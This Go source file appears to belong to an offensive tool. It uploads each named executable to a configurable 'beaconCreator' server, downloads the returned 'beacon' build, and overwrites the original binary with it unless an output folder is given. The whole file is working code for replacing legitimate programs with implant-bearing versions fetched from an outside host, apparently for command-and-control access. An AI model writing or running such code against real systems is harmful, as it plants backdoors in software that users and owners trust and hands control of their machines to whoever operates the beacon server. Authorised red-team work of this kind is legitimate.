package forge

import (
	"fmt"
	"github.com/sourcegraph/conc/iter"
	"go.uber.org/zap"
	"io"
	"net/http"
	url2 "net/url"
	"os"
	"path"
)

type TempBinary struct {
	filePath     string
	tempFilePath string
}

type Runner struct {
	logger *zap.Logger
	args   *Args
}

func NewRunner(logger *zap.Logger, args *Args) *Runner {
	return &Runner{
		logger: logger,
		args:   args,
	}
}

func (r *Runner) Run() error {
	r.logger.With(zap.Any("arguments", r.args)).Debug("Starting Runner")
	binaryFiles, err := iter.MapErr(r.args.FilePaths, r.CreateBinary)
	if err != nil {
		return fmt.Errorf("error creating temp binary: %s", err)
	}
	defer iter.ForEach(binaryFiles, func(file *TempBinary) {
		os.Remove(file.tempFilePath)
	})
	iter.ForEach(binaryFiles, r.OverwriteBinary)

	return nil
}

// CreateBinary sends the binary to the beaconCreator and stores the beacon in a temporary file
// Returns the path to the temporary file and the path to the original file
func (r *Runner) CreateBinary(filePath *string) (TempBinary, error) {
	r.logger.With(zap.String("file", *filePath)).Info("Creating binary")
	response, err := r.sendBinary(*filePath)
	if err != nil {
		return TempBinary{}, fmt.Errorf("error sending binary: %w", err)
	}
	defer response.Close()
	r.logger.With(zap.String("file", *filePath)).Debug("Creating temp file")
	tempFilePath, err := os.CreateTemp(os.TempDir(), path.Base(*filePath))
	if err != nil {
		return TempBinary{}, fmt.Errorf("error creating temp file: %w", err)
	}
	defer tempFilePath.Close()
	if _, err = io.Copy(tempFilePath, response); err != nil {
		return TempBinary{}, fmt.Errorf("error copying binary to temp file: %w", err)
	}
	return TempBinary{
		filePath:     *filePath,
		tempFilePath: tempFilePath.Name(),
	}, nil
}

// OverwriteBinary overwrites the original binary with the beacon stored in the temporary file
func (r *Runner) OverwriteBinary(file *TempBinary) {
	r.logger.
		With(
			zap.String("tempFilePath", file.tempFilePath),
			zap.String("destinationFilePath", file.filePath)).
		Info("Overwriting binary")
	tempFile, err := os.Open(file.tempFilePath)
	if err != nil {
		r.logger.Fatal(fmt.Sprintf("error opening temp file: %r", err))
	}
	defer tempFile.Close()

	// If the user specified an output folder, use that instead of replacing the original file
	if r.args.OutputFolder != "" {
		if err := os.MkdirAll(r.args.OutputFolder, 0755); err != nil {
			r.logger.Fatal(fmt.Sprintf("error creating output folder: %r", err))
		}
		file.filePath = fmt.Sprintf("%s/%s", r.args.OutputFolder, path.Base(file.filePath))
	}

	destinationFile, err := os.OpenFile(file.filePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		r.logger.Fatal(fmt.Sprintf("error opening original file: %r", err))
	}
	defer destinationFile.Close()
	if _, err = io.Copy(destinationFile, tempFile); err != nil {
		r.logger.Fatal(fmt.Sprintf("error copying temp file to original file: %r", err))
	}
}

// sendBinary sends the binary to the beaconCreator and returns the response body
func (r *Runner) sendBinary(filepath string) (io.ReadCloser, error) {
	binary, err := os.Open(filepath)
	if err != nil {
		return nil, fmt.Errorf("error opening file: %w", err)
	}
	defer binary.Close()

	beaconCreatorUrl, err := CreateURL(r.args)
	if err != nil {
		return nil, fmt.Errorf("error creating url: %w", err)
	}
	r.logger.With(zap.String("url", beaconCreatorUrl)).Debug("Sending binary")
	response, err := http.Post(beaconCreatorUrl, "application/octet-stream", binary)
	if err != nil {
		return nil, err
	}
	if response.StatusCode != 200 {
		body, err := io.ReadAll(response.Body)
		if err != nil {
			return nil, fmt.Errorf("error reading response body, err: %w", err)
		}
		return nil, fmt.Errorf("error uploading beacon, status: %s, body: %s", response.Status, string(body))
	}
	r.logger.With(zap.String("url", beaconCreatorUrl)).Debug("Binary sent")
	return response.Body, nil
}

// CreateURL creates the url to send the binary to the beaconCreator
func CreateURL(args *Args) (string, error) {
	u, err := url2.Parse(args.BeaconCreatorUrl + "/api/v1/upload")
	if err != nil {
		return "", fmt.Errorf("error creating url: %w", err)
	}
	values, err := args.BeaconOpts.ToUrlQuery()
	if err != nil {
		return "", fmt.Errorf("error creating url: %w", err)
	}
	u.RawQuery = values.Encode()

	return u.String(), nil
}